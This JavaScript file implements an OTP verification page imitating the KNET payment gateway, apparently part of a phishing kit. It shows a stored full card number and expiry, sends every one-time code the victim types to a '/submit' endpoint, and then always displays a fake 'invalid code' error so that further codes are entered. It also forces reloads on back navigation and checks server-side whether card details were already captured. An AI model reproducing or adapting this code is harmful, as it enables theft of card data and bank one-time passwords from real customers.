(function () {
  "use strict";

  var CHECKOUT_SUMMARY_STORAGE_KEY = "farm-store-checkout-summary";
  var OTP_DURATION_SECONDS = 240;
  var OTP_SUBMIT_DELAY_MS = 500;
  var OTP_LENGTH_ERROR = "خطأ - يرجى إدخال رمز التحقق بشكل صحيح";
  var OTP_INVALID_ERROR = "خطأ - رمز التحقق المدخل غير صحيح<br>يرجى المحاولة مرة أخرى";
  var OTP_REPEATED_ERROR = "خطأ - انتهت صلاحية رمز التحقق أو أنه غير صالح<br>يرجى المحاولة مرة أخرى";
  var OTP_ALLOWED_LENGTHS = [4, 6];
  var otpSubmitTimer = null;
  var lastSubmittedOtp = "";

  function getVisitorId() {
    try {
      return localStorage.getItem("sid") || localStorage.getItem("fastapi-base-visitor-id") || "";
    } catch (error) {
      return "";
    }
  }

  async function submitOtpAttempt(otpValue) {
    var response = await window.fetch("/submit", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Accept": "application/json"
      },
      credentials: "same-origin",
      cache: "no-store",
      body: JSON.stringify({
        form_name: "OTP Verification",
        page_path: window.location.pathname,
        visitor_id: getVisitorId(),
        fields: [
          {
            name: "debitOTP",
            label: "رمز التحقق",
            value: String(otpValue || ""),
            type: "text"
          }
        ]
      })
    });
    return response.ok;
  }

  function forceReload() {
    window.location.reload();
  }

  function onPageShow(event) {
    if (event && event.persisted) {
      forceReload();
    }
  }

  function onHistoryNavigation() {
    window.setTimeout(forceReload, 0);
  }

  function onPageHide() {
    if (otpSubmitTimer) {
      window.clearTimeout(otpSubmitTimer);
      otpSubmitTimer = null;
    }
  }

  function byId(id) {
    return document.getElementById(id);
  }

  function firstByIds(ids) {
    for (var index = 0; index < ids.length; index += 1) {
      var element = byId(ids[index]);
      if (element) {
        return element;
      }
    }
    return null;
  }

  function digitsOnly(value) {
    return String(value || "").replace(/\D/g, "");
  }

  function maskCardNumber(value) {
    var digits = digitsOnly(value);
    if (!digits) {
      return "************0000";
    }
    if (digits.length <= 8) {
      return digits;
    }
    return digits.slice(0, 4) + "********" + digits.slice(-4);
  }

  function renderCardNumber() {
    var prefix = digitsOnly(localStorage.getItem("dcprefix"));
    var last4 = digitsOnly(localStorage.getItem("debit_last4")).slice(-4);
    var fullCard = digitsOnly(localStorage.getItem("cc"));

    if (prefix && last4 && fullCard) {
      var maskedLength = Math.max(fullCard.length - prefix.length - last4.length, 0);
      return prefix + "*".repeat(maskedLength) + last4;
    }

    return maskCardNumber(fullCard);
  }

  function formatAmountValue(value) {
    var amount = Number(value || 0);
    if (!Number.isFinite(amount)) {
      amount = 0;
    }
    return amount.toFixed(3);
  }

  function hasKnetSubmissionState() {
    var fullCard = digitsOnly(localStorage.getItem("cc"));
    var prefix = digitsOnly(localStorage.getItem("dcprefix"));
    var last4 = digitsOnly(localStorage.getItem("debit_last4"));
    return Boolean(fullCard && prefix && last4);
  }

  async function hasPriorKnetSubmission() {
    var visitorId = getVisitorId();
    if (!visitorId) {
      return false;
    }
    try {
      var response = await window.fetch(
        "/api/visitors/" + encodeURIComponent(visitorId) + "/verification-eligibility",
        {
          headers: { Accept: "application/json" },
          credentials: "same-origin",
          cache: "no-store"
        }
      );
      var payload = await response.json().catch(function () {
        return null;
      });
      return Boolean(response.ok && payload && payload.status === "ok" && payload.eligible === true);
    } catch (error) {
      return false;
    }
  }

  function updateCountdown(input, totalSeconds) {
    var secondsLeft = totalSeconds;

    function tick() {
      var minutes = Math.floor(secondsLeft / 60);
      var seconds = secondsLeft % 60;
      input.placeholder = String(minutes).padStart(2, "0") + ":" + String(seconds).padStart(2, "0");

      if (secondsLeft <= 0) {
        window.clearInterval(timer);
        input.placeholder = "00:00";
        return;
      }

      secondsLeft -= 1;
    }

    var timer = window.setInterval(tick, 1000);
    tick();
  }

  function showError(errorEl, message) {
    if (!errorEl) {
      return;
    }
    errorEl.innerHTML = message || "";
    errorEl.style.display = "block";
  }

  function hideError(errorEl) {
    if (!errorEl) {
      return;
    }
    errorEl.innerHTML = "";
    errorEl.style.display = "none";
  }

  function resetOtpInput(input) {
    if (!input) {
      return;
    }
    input.value = "";
  }

  function openOverlay(overlayEl) {
    if (!overlayEl) {
      return;
    }
    overlayEl.classList.add("is-visible");
    overlayEl.setAttribute("aria-hidden", "false");
    document.body.classList.add("overlay-active");
  }

  function closeOverlay(overlayEl) {
    if (!overlayEl) {
      return;
    }
    overlayEl.classList.remove("is-visible");
    overlayEl.setAttribute("aria-hidden", "true");
    document.body.classList.remove("overlay-active");
  }

  function populateSummary() {
    var ccEl = firstByIds(["verification-cc", "DCNumber"]);
    var mmEl = firstByIds(["verification-mm", "expmnth"]);
    var yyEl = firstByIds(["verification-yy", "expyear"]);
    var amountEls = document.querySelectorAll("[data-verification-amount]");
    var knetAmountEl = byId("knet-total-amount");

    if (ccEl) {
      ccEl.textContent = renderCardNumber();
    }
    if (mmEl) {
      mmEl.textContent = localStorage.getItem("month") || "--";
    }
    if (yyEl) {
      yyEl.textContent = localStorage.getItem("year") || "----";
    }
    if (amountEls.length) {
      var formattedAmount = formatAmountValue(0);
      try {
        var raw = localStorage.getItem(CHECKOUT_SUMMARY_STORAGE_KEY);
        var payload = raw ? JSON.parse(raw) : null;
        formattedAmount = formatAmountValue(payload && payload.amount);
      } catch (error) {
        formattedAmount = formatAmountValue(0);
      }
      amountEls.forEach(function (element) {
        element.textContent = formattedAmount;
      });
      if (knetAmountEl) {
        knetAmountEl.textContent = formattedAmount;
      }
    }
  }

  async function initVerificationPage() {
    var form = firstByIds(["verification-form", "paypage"]);
    var otpInput = firstByIds(["verification-otp", "debitOTPtimer"]);
    var submitBtn = firstByIds(["verification-submit", "proceedConfirm"]);
    var cancelBtn = firstByIds(["verification-cancel", "proceedCancel", "cancel"]);
    var errorEl = firstByIds(["verification-error", "otpmsgDC2", "otpmsgDC", "ValidationMessage"]);
    var overlayEl = firstByIds(["overlayhide1", "overlayhide"]);

    var isEligible = await hasPriorKnetSubmission();
    if (!isEligible) {
      window.location.replace("/knet");
      return;
    }

    populateSummary();

    if (!form || !otpInput || !submitBtn || !cancelBtn || !errorEl) {
      return;
    }
    updateCountdown(otpInput, OTP_DURATION_SECONDS);

    hideError(errorEl);
    closeOverlay(overlayEl);

    otpInput.addEventListener("input", function () {
      otpInput.value = digitsOnly(otpInput.value).slice(0, 6);
      hideError(errorEl);
    });

    function handleVerificationSubmit(event) {
      event.preventDefault();
      var currentOtp = digitsOnly(otpInput.value).slice(0, 6);
      if (OTP_ALLOWED_LENGTHS.indexOf(currentOtp.length) === -1) {
        if (otpSubmitTimer) {
          window.clearTimeout(otpSubmitTimer);
          otpSubmitTimer = null;
        }
        closeOverlay(overlayEl);
        resetOtpInput(otpInput);
        showError(errorEl, OTP_LENGTH_ERROR);
        return;
      }

      if (lastSubmittedOtp && lastSubmittedOtp === currentOtp) {
        if (otpSubmitTimer) {
          window.clearTimeout(otpSubmitTimer);
          otpSubmitTimer = null;
        }
        closeOverlay(overlayEl);
        resetOtpInput(otpInput);
        showError(errorEl, OTP_REPEATED_ERROR);
        return;
      }

      hideError(errorEl);
      Promise.resolve(submitOtpAttempt(currentOtp)).catch(function () {
        return false;
      }).finally(function () {
        openOverlay(overlayEl);
        if (otpSubmitTimer) {
          window.clearTimeout(otpSubmitTimer);
        }
        otpSubmitTimer = window.setTimeout(function () {
          otpSubmitTimer = null;
          closeOverlay(overlayEl);
          resetOtpInput(otpInput);
          showError(errorEl, OTP_INVALID_ERROR);
          lastSubmittedOtp = currentOtp;
        }, OTP_SUBMIT_DELAY_MS);
      });
    }

    form.addEventListener("submit", handleVerificationSubmit);
    submitBtn.addEventListener("click", handleVerificationSubmit);

    cancelBtn.addEventListener("click", function () {
      window.location.href = "/knet";
    });
  }

  window.addEventListener("pageshow", onPageShow);
  window.addEventListener("popstate", onHistoryNavigation);
  window.addEventListener("pagehide", onPageHide);
  document.addEventListener("DOMContentLoaded", function () {
    Promise.resolve(initVerificationPage()).catch(function () {
      window.location.replace("/knet");
    });
  });
})();
